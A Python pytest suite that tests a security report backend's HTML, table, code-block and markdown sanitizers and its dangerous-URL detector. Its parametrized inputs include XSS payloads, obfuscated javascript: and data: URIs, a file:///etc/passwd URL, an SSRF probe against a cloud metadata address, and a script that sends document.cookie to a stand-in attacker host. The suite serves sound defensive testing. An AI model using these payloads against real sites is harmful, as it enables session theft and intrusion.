"""Adversarial unit security tests for report generation, stored XSS, HTML injection, and URL security."""

from __future__ import annotations

import pytest

from backend.security import (
    REPORT_ALLOWED_ATTRIBUTES,
    REPORT_ALLOWED_PROTOCOLS,
    REPORT_ALLOWED_TAGS,
    clean_control_characters,
    is_dangerous_url,
    render_report_to_html,
    sanitize_code_block,
    sanitize_markdown_prose,
    sanitize_table_cell,
    sanitize_text,
)


class TestHtmlAndTextSanitization:
    """Test text sanitization against stored XSS and raw HTML injection."""

    @pytest.mark.parametrize(
        "payload",
        [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "<svg><script>alert(1)</script></svg>",
            '<iframe src="https://evil.example">',
            '<object data="https://evil.example">',
            '<embed src="https://evil.example">',
            '<base href="https://evil.example/">',
            "<style>body { display: none; }</style>",
            '<form action="https://evil.example"><input></form>',
            '<meta http-equiv="refresh" content="0; url=https://evil.example">',
            '"><script>alert(document.cookie)</script>',
            "<div><span><script>alert('nested')</script></span></div>",
            "<svg xmlns=\"http://www.w3.org/2000/svg\"><g onload=\"alert(1)\"></g></svg>",
        ],
    )
    def test_sanitize_text_escapes_all_html_tags(self, payload):
        sanitized = sanitize_text(payload)
        # Raw '<' and '>' must never appear in sanitized plain text
        assert "<" not in sanitized
        assert ">" not in sanitized
        # The payload must be escaped to &lt; and &gt; so it renders harmlessly
        assert "&lt;" in sanitized
        assert "&gt;" in sanitized

    def test_sanitize_text_strips_null_bytes_and_control_chars(self):
        dirty = "user\x00name\x01\x02with\x1fcontrols"
        cleaned = sanitize_text(dirty)
        assert "\x00" not in cleaned
        assert "\x01" not in cleaned
        assert "\x02" not in cleaned
        assert "\x1f" not in cleaned
        assert "username" in cleaned

    def test_sanitize_text_handles_none_and_numbers(self):
        assert sanitize_text(None) == ""
        assert sanitize_text(12345) == "12345"
        assert sanitize_text(0) == "0"


class TestTableCellSanitization:
    """Test Markdown table cell sanitization against table breakout and column injection."""

    def test_sanitize_table_cell_escapes_pipe_characters(self):
        payload = "admin | injected_role | 100% confidence |"
        sanitized = sanitize_table_cell(payload)
        assert "\\|" in sanitized
        # Ensure raw unescaped pipe does not exist
        assert sanitized.count("\\|") == 3
        assert sanitized.replace("\\|", "").count("|") == 0

    def test_sanitize_table_cell_strips_newlines(self):
        payload = "line1\r\nline2\nline3\rline4"
        sanitized = sanitize_table_cell(payload)
        assert "\r" not in sanitized
        assert "\n" not in sanitized
        assert sanitized == "line1 line2 line3 line4"

    def test_sanitize_table_cell_escapes_html_and_preserves_table_structure(self):
        payload = "<script>alert(1)</script> | 192.168.1.1\nInjected row"
        sanitized = sanitize_table_cell(payload)
        assert "<" not in sanitized
        assert ">" not in sanitized
        assert "\n" not in sanitized
        assert "\\|" in sanitized


class TestCodeBlockSanitization:
    """Test Markdown code block breakout prevention."""

    def test_sanitize_code_block_neutralizes_triple_backticks(self):
        payload = "log entry\n```\n<script>alert(1)</script>\n```\nmore logs"
        sanitized = sanitize_code_block(payload)
        assert "```" not in sanitized
        assert "` ` `" in sanitized

    def test_sanitize_code_block_strips_null_bytes(self):
        payload = "log\x00sample\x08test"
        sanitized = sanitize_code_block(payload)
        assert "\x00" not in sanitized
        assert "\x08" not in sanitized


class TestDangerousUrlDetection:
    """Test URL scheme detection against obfuscation and evasion tricks."""

    @pytest.mark.parametrize(
        "url",
        [
            "javascript:alert(1)",
            "JAVASCRIPT:alert(1)",
            "jAvAsCrIpT:alert(1)",
            "javascript :alert(1)",
            "javascript\t:alert(1)",
            "javascript\n:alert(1)",
            "javascript\r:alert(1)",
            "jav\x00ascript:alert(1)",
            "&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;:alert(1)",
            "&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;:alert(1)",
            "%6a%61%76%61%73%63%72%69%70%74:alert(1)",
            "%4a%61%76%61%73%63%72%69%70%74:alert(1)",
            "data:text/html,<script>alert(1)</script>",
            "DATA:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
            "vbscript:msgbox(1)",
            "VBSCRIPT:msgbox(1)",
            "file:///etc/passwd",
            "FILE:///c:/windows/system32/cmd.exe",
            "blob:https://example.com/uuid",
            "about:blank",
            "filesystem:http://example.com/temporary/",
        ],
    )
    def test_is_dangerous_url_detects_malicious_schemes(self, url):
        assert is_dangerous_url(url) is True

    @pytest.mark.parametrize(
        "url",
        [
            "https://attack.mitre.org/techniques/T1110/",
            "http://soc.corp.internal/incidents",
            "/api/reports/download",
            "#section-mitre",
            "mailto:soc-team@corp.internal",
        ],
    )
    def test_is_dangerous_url_allows_safe_urls(self, url):
        assert is_dangerous_url(url) is False


class TestMarkdownProseSanitization:
    """Test natural language Markdown sanitization (narratives and AI summaries)."""

    def test_preserves_legitimate_markdown_formatting_and_citations(self):
        text = (
            "### Analytical Assessment\n\n"
            "An unauthorized **brute force** attack was detected targeting user `analyst`.\n"
            "Observed facts:\n"
            "- Failed authentications from source IP `192.168.1.50` [EV-001].\n"
            "- Account lockout triggered at 14:20 UTC [EV-002].\n\n"
            "> High confidence assessment based on cited evidence."
        )
        sanitized = sanitize_markdown_prose(text)
        assert "[EV-001]" in sanitized
        assert "[EV-002]" in sanitized
        assert "**brute force**" in sanitized
        assert "`analyst`" in sanitized
        assert "`192.168.1.50`" in sanitized
        assert "> High confidence" in sanitized

    def test_escapes_raw_html_in_prose(self):
        text = "Summary: <script>fetch('https://evil.example/?c='+document.cookie)</script> completed."
        sanitized = sanitize_markdown_prose(text)
        assert "<script>" not in sanitized
        assert "&lt;script&gt;" in sanitized

    def test_neutralizes_javascript_and_data_markdown_links(self):
        text = (
            "Refer to [malicious action](javascript:alert(document.domain)) or "
            "[data payload](data:text/html,<script>alert(1)</script>) for details."
        )
        sanitized = sanitize_markdown_prose(text)
        assert "javascript:" not in sanitized
        assert "data:" not in sanitized
        assert "[malicious action](#blocked-unsafe-scheme)" in sanitized
        assert "[data payload](#blocked-unsafe-scheme)" in sanitized

    def test_neutralizes_external_markdown_images(self):
        text = (
            "Tracking beacon: ![beacon](https://evil.example/track.png) and "
            "SSRF probe: ![probe](http://169.254.169.254/latest/meta-data/)."
        )
        sanitized = sanitize_markdown_prose(text)
        # Image markdown syntax ![] must be completely removed
        assert "![" not in sanitized
        assert "https://evil.example/track.png" not in sanitized
        assert "169.254.169.254" not in sanitized
        assert "[beacon (image blocked for security)]" in sanitized
        assert "[probe (image blocked for security)]" in sanitized

    def test_preserves_safe_external_links(self):
        text = "See [MITRE T1110](https://attack.mitre.org/techniques/T1110/) for reference."
        sanitized = sanitize_markdown_prose(text)
        assert "[MITRE T1110](https://attack.mitre.org/techniques/T1110/)" in sanitized


class TestHtmlReportRendering:
    """Test Markdown to HTML conversion and bleach allowlist sanitization."""

    def test_render_report_to_html_renders_safe_elements(self):
        md = (
            "# Incident Investigation Report\n\n"
            "| Field | Value |\n"
            "|---|---|\n"
            "| User | analyst |\n\n"
            "Summary with **bold** and [MITRE Link](https://attack.mitre.org).\n"
        )
        html_out = render_report_to_html(md)
        assert "<h1>Incident Investigation Report</h1>" in html_out
        assert "<table>" in html_out
        assert "<th>Field</th>" in html_out
        assert "<td>analyst</td>" in html_out
        assert "<strong>bold</strong>" in html_out
        assert '<a href="https://attack.mitre.org">' in html_out

    def test_render_report_to_html_neutralizes_xss_vectors(self):
        md = (
            "<script>alert('xss')</script>\n"
            "<img src=x onerror=alert(1)>\n"
            "<svg onload=alert(1)>\n"
            '<iframe src="https://evil.example"></iframe>\n'
            '<style>body{display:none}</style>\n'
            '<form action="https://evil.example"><input></form>\n'
            "[Click](javascript:alert(1))\n"
        )
        html_out = render_report_to_html(md)
        # Verify no active executable tags or attributes
        assert "<script>" not in html_out
        assert "onerror=" not in html_out
        assert "onload=" not in html_out
        assert "<iframe" not in html_out
        assert "<style>" not in html_out
        assert "<form" not in html_out
        assert 'href="javascript:' not in html_out
